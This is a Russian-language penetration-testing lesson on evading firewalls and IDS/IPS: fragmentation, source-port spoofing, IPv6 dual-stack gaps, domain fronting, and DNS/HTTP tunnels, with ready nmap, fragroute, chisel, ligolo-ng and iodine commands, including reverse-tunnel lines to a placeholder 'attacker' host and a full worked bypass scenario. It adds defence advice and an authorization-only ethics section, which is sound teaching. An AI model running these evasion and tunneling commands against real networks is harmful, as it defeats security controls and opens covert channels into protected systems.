Firewall и IDS/IPS — это фильтры, которые «видят» трафик не так, как его видит сеть. Правила строятся вокруг IP/порта/протокола/состояния и сигнатур, а обход использует расхождение между моделью фильтра и реальностью пакета: неполный разбор, доверие к портам, забытые протоколы (IPv6, ICMP), асимметричная маршрутизация. Урок опирается на [`network-covert`](network-covert) и [`network-portscan`](network-portscan); техники упаковки трафика подробнее — в [`network-tunneling`](network-tunneling).

## Модель угроз: что именно фильтруется

Прежде чем обходить, надо понять, **что** перед вами и **как** оно принимает решения. Классы устройств и их логика:

- **Stateless ACL (роутер/ACL)** — решение по 5-tuple (src/dst IP, src/dst порт, протокол). Не смотрит на состояние и содержимое. Обход: доверенные порты, фрагментация, нестандартные порты.
- **Stateful firewall** — отслеживает сессии и пропускает ответные пакеты. Обход: асимметрия, тайм-ауты, инъекция в существующую сессию.
- **Proxy/next-gen firewall (NGFW)** — разбирает приложение (L7), TLS-инспекция, категории. Обход: шифрование, domain fronting, ECH, разрешённые сервисы как транспорт.
- **IDS** — пассивно сопоставляет сигнатуры, часто без нормализации. Обход: фрагментация, переупорядочивание, кодирование, шифрование.
- **IPS** — то же, но инлайн, может дропать. Обход: те же техники, но нужна устойчивость к reassembly/нормализации.

Главный принцип: **обход ищет разрыв между тем, что фильтр думает, и тем, что происходит на проводе**. Поэтому сначала определите, где именно теряется видимость: на уровне L2 (MAC/VLAN), L3 (IP/фрагменты), L4 (порты/состояние) или L7 (протокол/содержимое).

## Разведка фильтрации перед обходом

Не начинайте с трюков — сначала картируйте разрешённое. Полезно выяснить: что разрешено наружу (egress), есть ли stateful, нормализует ли IPS фрагменты, фильтруется ли IPv6.

```bash
# Что вообще ходит наружу? Пробуем типовые "разрешённые" порты
for p in 53 80 443 1194 123 8080; do
  timeout 2 bash -c "echo > /dev/tcp/1.1.1.1/$p" 2>/dev/null && echo "TCP $p open"
done
# UDP-проба DNS (почти всегда разрешён)
dig +short +time=2 @8.8.8.8 example.com
# Порт-киддинг: доверенный source-порт 53 против ACL
nmap -g 53 -Pn -p445 target
# ACK-скан: показывает, что firewall пропускает БЕЗ установки сессии
nmap -sA -Pn -p1-1024 target
```

Интерпретация: `-sA` (ACK-скан) не устанавливает соединение, поэтому показывает фильтрацию «независимо от состояния». `unfiltered` в ACK-скане = порт пропускается ACL, но не обязательно открыт сервис. `filtered` = пакеты дропаются.

## Фрагментация: как это работает и чем ломается

Фрагментация разбивает IP-датаграмму на части. Простые IDS/ACL не собирают фрагменты обратно и не видят сигнатуру или заголовок транспортного уровня целиком (для первого фрагмента L4-заголовок виден, для последующих — нет).

- `nmap -f` — фрагментирует по 8 байт.
- `nmap --mtu 8` — задаёт размер фрагмента (кратен 8).
- `nmap --data-length 24` — добавляет padding, чтобы сместить сигнатуру.
- **Overlapping fragments** — перекрытие с разными данными: одни стеки собирают по «первому», другие по «последнему» фрагменту → расхождение между IDS и хостом.

```bash
# Классика: фрагментированный SYN-скан
nmap -f --mtu 8 -Pn -p445 target
# Комбинация с источником-портом DNS
nmap -f -g 53 -Pn -p445 target
# fragroute: перезапись трафика по правилам (Linux, ipfw)
fragroute -f frag.conf target
```

Содержимое `frag.conf` (пример политики):

```text
ip_frag 8
ip_frag 16
order random
print
```

Современные IPS (Snort/Suricata с stream-реассемблированием, Linux `nf_conntrack`, Windows reassembly) **собирают** фрагменты до анализа — против них фрагментация бесполезна. Поэтому сначала проверьте, нормализуется ли трафик.

## Порт-киддинг и доверенные порты

Многие ACL разрешают трафик **с** (или **на**) определённые порты, не проверяя, какой сервис реально внутри. Спуфинг source-порта использует это доверие.

- `nmap -g 53` — source port 53 (DNS) обходит правила «разрешить DNS».
- `nmap -g 80`, `-g 443` — то же для web.
- Комбинация с фрагментацией и `--data-length` усиливает.

```bash
nmap -g 53 --source-port 53 -Pn -p22,445,3389 target
ncat -p 53 target 445     # ручная проверка с source port 53
```

Правило вида `permit udp any eq 53 any` разрешит и ваш SSH-трафик с source port 53, если протокол совпал (для TCP обычно отдельные правила). Часто «дыра» — в UDP-правилах DNS/SNMP/NTP.

## Туннелирование и инкапсуляция

Самый надёжный обход — **упаковать** запрещённый протокол в разрешённый. Классические носители: DNS (UDP/53), ICMP, HTTP(S), SSH.

- **DNS**: `iodine`, `dnscat2`, `dns2tcp` — IP/TCP поверх DNS-запросов.
- **ICMP**: `ptunnel`, `icmpsh` — поверх echo-request/reply.
- **HTTP(S)**: `chisel`, `ligolo-ng`, `ssh -D` через 443.
- **SSH**: локальный/удалённый/динамический форвард (`-L/-R/-D`).

```bash
# chisel: сервер на attacker:443, клиент в целевой сети
# attacker: chisel server -p 443 --reverse --socks5
# target:   chisel client https://attacker:443 R:socks
# После — proxychains по 127.0.0.1:1080
# ligolo-ng: современная альтернатива с TUN-интерфейсом
# attacker: ./proxy -selfcert
# target:   ./agent -connect attacker:11601 -ignore-cert
```

DNS/ICMP-туннели медленнее, но проходят там, где разрешён только DNS. HTTP(S)-туннели выглядят как обычный web-трафик и почти не блокируются.

## IPv6 и обход двойного стека

Хосты с **двойным стеком** часто имеют IPv6-путь, который фильтруется **хуже** IPv4: правила забыли, IPv6 включён по умолчанию (SLAAC), а firewall настроен только для IPv4.

- Проверка пути: `ping6`, `nmap -6`.
- **Teredo/6to4/ISATAP** — автоматические туннели IPv6 через IPv4, часто разрешены.
- **RA/SLAAC** — хост сам получает IPv6-адрес и маршрут (см. `network-ipv6`).
- Нестандартные порты для известных сервисов.

```bash
# Есть ли IPv6-путь до цели?
ping6 -c2 target6
nmap -6 -Pn -p22,445 target6
# IPv4-in-IPv6 туннель (6to4)
ip -6 tunnel add tun6to4 mode sit remote any local <ipv4>
```

Если IPv6 не фильтруется, весь IPv4-контроль обходится автоматически.

## Обход контентной фильтрации и DPI

DPI смотрит внутрь пакета. Против него:

- **Кодирование** (base64, gzip, hex) в разрешённом протоколе.
- **Шифрование** (TLS) — скрывает содержимое, но метаданные (SNI) могут утекать.
- **Domain fronting** — SNI одного (разрешённого CDN) домена, а `Host` — целевого; CDN маршрутизирует по `Host`.
- **ECH (Encrypted ClientHello)** — шифрует SNI; фильтрация по SNI ломается.
- **Эквивалентные пути** — прокси, релей, зеркала.
- **Разбиение сигнатуры** на несколько сегментов (`--data-length`, малые MSS).

```bash
# Проверить SNI и HSTS
openssl s_client -connect target:443 -servername allowed.com </dev/null 2>/dev/null | grep -i 'subject='
curl -sI https://target/ | grep -iE 'strict-transport-security|alt-svc'
```

## Обход stateful-проверки и асимметрия

Stateful firewall держит таблицу сессий по 5-tuple. Обходы:

- **Асимметричная маршрутизация** — ответ идёт в обход устройства; оно теряет состояние и дропает легитимный трафик, либо пропускает пакеты, не видя начала сессии.
- **Фрагментация** может рассинхронизировать таблицу состояний.
- **Спуфинг источника** внутри доверенной сети (если антиспуфинг не включён).
- **Тайм-ауты сессий** — долгая пауза разрывает состояние; затем можно «вклиниться».
- **TCP-инъекция** в существующую сессию при предсказуемых seq (см. `network-tcp-hijacking`).

```bash
# Показать, что пропускается без состояния
nmap -sA -Pn -p1-1024 target
# TTL-манипуляция для обхода path-based правил
nmap --ttl 63 -Pn -p445 target
```

## Сегментация и её обход

Сегментация — главный контроль, но её обходят через **pivot**:

- **Компрометированный хост** в другом сегменте (reverse-туннель, SOCKS).
- **Dual-homed** хосты (две NIC) — мост между сегментами.
- **VLAN hopping** (см. `network-vlan-hopping`) — выход за пределы VLAN.
- **IPv6 RA/DHCPv6** — если сегмент фильтруется только по IPv4.
- **Прокси/реверс-прокси** внутри DMZ.

```bash
# Простой pivot через ssh -D (SOCKS на локальном порту)
ssh -D 1080 user@pivot
proxychains4 nmap -sT -Pn -p445 10.10.20.5
```

## Инструменты и флаги

```bash
# Фрагментация и MTU
nmap -f -Pn target              # по 8 байт
nmap --mtu 16 -Pn target        # кратно 8
nmap --data-length 50 -Pn target
# Decoys: маскировка источника в логах
nmap -D RND:10 -Pn target
# Source port (порт-киддинг)
nmap -g 53 -Pn target
# ACK-скан (карта фильтрации)
nmap -sA -Pn target
# UDP (часто слабее фильтруется)
nmap -sU --top-ports 50 -Pn target
# fragroute (ipfw/BSD)
fragroute -f frag.conf target
# chisel/ligolo для туннеля
chisel server -p 443 --reverse
```

## Разобранный пример: полный сценарий обхода

Цель: достучаться до внутреннего SMB (445), наружу разрешён только DNS/HTTP.

```bash
# 1. Разведка egress
dig +short @8.8.8.8 example.com          # DNS ходит
curl -sI https://example.com/ | head -1  # HTTPS ходит
# 2. Проверяем фрагментацию против IPS
nmap -f -g 53 -Pn -p445 target           # если filtered -> IPS нормализует
# 3. Ставим HTTP-туннель на 443
#    attacker: chisel server -p 443 --reverse --socks5
#    target:   chisel client https://attacker:443 R:socks
# 4. Через SOCKS достукиваемся до внутреннего SMB
proxychains4 nmap -sT -Pn -p445 10.10.20.5
# 5. Если DNS — единственный выход, поднимаем iodine/dnscat2
iodine -f -P secret t.example.com
```

Результат: обход не «ломает» firewall, а использует разрешённые каналы как транспорт.

## Детект и защита

- **Нормализация трафика** (сборка фрагментов, перезапись TTL/IP ID, выравнивание) до анализа на IPS.
- **Полные правила для IPv6**, а не только IPv4; отключить ненужные туннели (6to4/Teredo).
- **Egress-фильтрация** по allowlist (порт + назначение), а не по «разрешить всё наружу».
- **Антиспуфинг** (uRPF/BCP38) против подделки источника.
- **TLS-инспекция** где допустимо + политики SNI/ECH.
- **Сегментация** и мониторинг аномалий (beaconing, длинные сессии к внешним IP).

## Частые ошибки

- **Полагаться на IDS без нормализации** — фрагментация обходит.
- **Забыть IPv6-правила** — двойной стек = обход.
- **Доверять «доверенным» портам** — порт-киддинг.
- **Игнорировать UDP** — часто фильтруется слабее TCP.
- **Считать TLS-инспекцию панацеей** — pinning/ECH/domain fronting обходят.
- **Путать ACL и stateful** — техники обхода разные.
- **Тестировать без разрешения** — обход фильтров в чужих сетях незаконен.

## Сравнение техник обхода

| Техника | Против чего | Работает при | Ломается о |
|---------|-------------|--------------|------------|
| Фрагментация | stateless IDS/ACL | нет нормализации | reassembly/IPS |
| Порт-киддинг | ACL по портам | доверие к 53/80/443 | stateful L7 |
| Туннель DNS/HTTP | egress-фильтр | разрешён носитель | DPI/энтропия |
| IPv6 | IPv4-only правила | двойной стек | полный IPv6 ACL |
| Domain fronting | SNI-фильтр | доверенный CDN | ECH off + инспекция Host |
| Шифрование | DPI/контент | TLS разрешён | TLS-инспекция |

## Этические границы

Обход фильтров допустим **только** в авторизованном тесте и на согласованных диапазонах. Техники обхода в чужих сетях (в т.ч. «просто проверить») — нарушение закона и политик провайдера. В отчёте фиксируйте, какие контроли обойдены и как их усилить: это главная ценность теста обхода.

## Что дальше / решение

Дальнейшие шаги зависят от результата разведки фильтрации:

- Если egress разрешает **только DNS** → переходите к `network-dns-tunnel` (iodine/dnscat2).
- Если разрешён **HTTP(S)** → `network-tunneling` и `network-ssh-tunnel` (chisel/ligolo/SSH).
- Если есть **двойной стек** → `network-ipv6` (RA/SLAAC/туннели).
- Если нужно спрятать передачу в метаданных → `network-covert` и `network-covert-timing`.
- Для защиты/детекта → изучите нормализацию и мониторинг аномалий, затем закройте правила.

Решение (алгоритм): 1) картировать egress; 2) проверить нормализацию (фрагментация/порт-киддинг); 3) выбрать носитель из разрешённых; 4) поднять туннель; 5) зафиксировать обойдённые контроли и рекомендации.
